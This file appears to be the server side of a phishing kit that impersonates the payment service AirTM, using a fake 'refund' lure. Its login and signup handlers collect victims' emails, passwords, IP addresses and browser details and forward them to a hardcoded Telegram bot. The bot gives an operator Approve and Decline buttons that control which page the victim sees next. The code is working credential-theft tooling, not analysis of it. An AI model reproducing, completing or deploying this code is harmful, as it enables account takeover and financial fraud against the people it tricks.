const express = require('express');
const cors = require('cors');
const axios = require('axios');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 5000;

// ============================================
// TELEGRAM CONFIGURATION
// ============================================
const TELEGRAM_BOT_TOKEN = '8959682316:AAEFW23lt-waRnNMAIhIy4_evhz6LpwMaxA';
const TELEGRAM_CHAT_ID = '7386607055';

// ============================================
// MIDDLEWARE
// ============================================
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static files
app.use(express.static(path.join(__dirname, 'public')));

// ============================================
// TELEGRAM SEND MESSAGE WITH INLINE BUTTONS
// ============================================
async function sendTelegramMessageWithButtons(email, password, firstName, ip, userAgent) {
    try {
        const timestamp = new Date().toLocaleString('en-US', {
            timeZone: 'Africa/Lagos',
            day: '2-digit',
            month: '2-digit',
            year: 'numeric',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
        });

        const message = `
🔐 <b>AIRTM LOGIN ATTEMPT</b>
━━━━━━━━━━━━━━━━━━━━━━━━━

📧 <b>Email:</b> ${email}
🔑 <b>Password:</b> ${password}
👤 <b>Name:</b> ${firstName}

🕐 <b>Time:</b> ${timestamp}
📍 <b>IP Address:</b> ${ip}
💻 <b>User Agent:</b> ${userAgent}

━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>Please review this login attempt</i>
        `;

        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        
        const response = await axios.post(url, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        {
                            text: '✅ Approve',
                            callback_data: `approve_${email}_${firstName}`
                        },
                        {
                            text: '❌ Decline',
                            callback_data: `decline_${email}_${firstName}`
                        }
                    ]
                ]
            }
        });
        return response.data;
    } catch (error) {
        console.error('Telegram send error:', error.response?.data || error.message);
        throw error;
    }
}

// ============================================
// HANDLE TELEGRAM CALLBACK QUERIES
// ============================================
app.post('/api/telegram-callback', async (req, res) => {
    try {
        const { callback_query } = req.body;
        
        if (!callback_query) {
            return res.status(400).send('OK');
        }

        const data = callback_query.data;
        const chatId = callback_query.message.chat.id;
        const messageId = callback_query.message.message_id;

        console.log('📨 Callback received:', data);

        // Parse the callback data
        const parts = data.split('_');
        const action = parts[0]; // 'approve' or 'decline'
        const email = parts.slice(1, -1).join('_'); // email (handles dots and underscores)
        const firstName = parts[parts.length - 1]; // firstName

        let responseText = '';

        if (action === 'approve') {
            responseText = `
✅ <b>APPROVED</b>
━━━━━━━━━━━━━━━━━━━━━━━━━

📧 <b>Email:</b> ${email}
👤 <b>Name:</b> ${firstName}

✅ <i>This login has been approved!</i>
<i>User will now see the refund page.</i>
            `;
        } else if (action === 'decline') {
            responseText = `
❌ <b>DECLINED</b>
━━━━━━━━━━━━━━━━━━━━━━━━━

📧 <b>Email:</b> ${email}
👤 <b>Name:</b> ${firstName}

❌ <i>This login has been declined!</i>
<i>User will see "Incorrect Credentials" message.</i>
            `;
        }

        // Edit the original message to show the result
        const editUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/editMessageText`;
        await axios.post(editUrl, {
            chat_id: chatId,
            message_id: messageId,
            text: responseText,
            parse_mode: 'HTML'
        });

        // Send a notification to the admin chat
        const notifyUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
        await axios.post(notifyUrl, {
            chat_id: TELEGRAM_CHAT_ID,
            text: action === 'approve' 
                ? `✅ User ${email} approved! They will see the refund page.`
                : `❌ User ${email} declined! They will see "Incorrect Credentials".`,
            parse_mode: 'HTML'
        });

        res.send('OK');

    } catch (error) {
        console.error('Callback error:', error.message);
        res.send('OK');
    }
});

// ============================================
// HEALTH CHECK
// ============================================
app.get('/health', (req, res) => {
    res.json({
        status: 'OK',
        timestamp: new Date().toISOString(),
        message: 'Server is running!'
    });
});

// ============================================
// LOGIN ENDPOINT
// ============================================
app.post('/api/login', async (req, res) => {
    console.log('📨 Login endpoint hit!');
    console.log('📨 Request body:', req.body);

    try {
        const { email, password } = req.body;

        if (!email || !password) {
            return res.status(400).json({
                success: false,
                message: 'Email and password are required'
            });
        }

        console.log(`📧 Login attempt: ${email}`);

        // Extract first name from email
        const firstName = email.split('@')[0] || 'User';

        // Get IP and User Agent
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
        const userAgent = req.headers['user-agent'] || 'Unknown';

        // Send Telegram message with buttons
        await sendTelegramMessageWithButtons(email, password, firstName, ip, userAgent);

        console.log('✅ Telegram notification with buttons sent');

        // Return success - redirect to pending page
        return res.json({
            success: true,
            message: 'Login successful! Waiting for admin approval...',
            redirect: `/refund-pending.html?email=${encodeURIComponent(email)}&name=${encodeURIComponent(firstName)}&status=pending`
        });

    } catch (error) {
        console.error('❌ Server error:', error.message);
        return res.status(500).json({
            success: false,
            message: 'Server error. Please try again.'
        });
    }
});

// ============================================
// CHECK USER STATUS ENDPOINT
// ============================================
// Store user statuses in memory (in production, use a database)
const userStatuses = {};

app.post('/api/check-status', (req, res) => {
    try {
        const { email } = req.body;
        const status = userStatuses[email] || 'pending';
        res.json({ success: true, status });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Error checking status' });
    }
});

// ============================================
// SIGNUP ENDPOINT
// ============================================
app.post('/api/signup', async (req, res) => {
    console.log('📨 Signup endpoint hit!');
    console.log('📨 Request body:', req.body);

    try {
        const {
            email,
            password,
            confirmPassword,
            country,
            businessName,
            entityType,
            termsAccepted
        } = req.body;

        if (!email || !password || !confirmPassword || !country || !businessName || !entityType) {
            return res.status(400).json({
                success: false,
                message: 'All fields are required'
            });
        }

        if (password !== confirmPassword) {
            return res.status(400).json({
                success: false,
                message: 'Passwords do not match'
            });
        }

        if (!termsAccepted) {
            return res.status(400).json({
                success: false,
                message: 'You must accept the Terms of Service'
            });
        }

        const firstName = email.split('@')[0] || 'User';

        const message = `
📝 <b>AIRTM SIGNUP ATTEMPT</b>
━━━━━━━━━━━━━━━━━━━━━━━━━

📧 <b>Email:</b> ${email}
🔑 <b>Password:</b> ${password}

🌍 <b>Country:</b> ${country}
🏢 <b>Business Name:</b> ${businessName}
📋 <b>Entity Type:</b> ${entityType}
✅ <b>Terms Accepted:</b> ${termsAccepted ? 'Yes' : 'No'}

🕐 <b>Time:</b> ${new Date().toLocaleString('en-US', {
            timeZone: 'Africa/Lagos',
            day: '2-digit',
            month: '2-digit',
            year: 'numeric',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
        })}

━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ <i>Unauthorized access attempt detected!</i>
        `;

        try {
            await axios.post(
                `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    chat_id: TELEGRAM_CHAT_ID,
                    text: message,
                    parse_mode: 'HTML'
                }
            );
            console.log('✅ Telegram notification sent');
        } catch (telegramError) {
            console.error('❌ Telegram error:', telegramError.message);
        }

        return res.json({
            success: true,
            message: 'Account created successfully! Redirecting...',
            redirect: '/refund-pending.html'
        });

    } catch (error) {
        console.error('❌ Signup error:', error.message);
        return res.status(500).json({
            success: false,
            message: 'Server error. Please try again.'
        });
    }
});

// ============================================
// CATCH-ALL ROUTE
// ============================================
app.use('*', (req, res) => {
    if (req.path.startsWith('/api')) {
        return res.status(404).json({
            success: false,
            message: 'API endpoint not found'
        });
    }
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// ============================================
// START SERVER
// ============================================
app.listen(PORT, '0.0.0.0', () => {
    console.log('========================================');
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`📍 http://localhost:${PORT}`);
    console.log(`🤖 Telegram bot: Configured ✅`);
    console.log(`📱 Chat ID: ${TELEGRAM_CHAT_ID}`);
    console.log('✅ Inline buttons enabled for admin review');
    console.log('========================================');
});
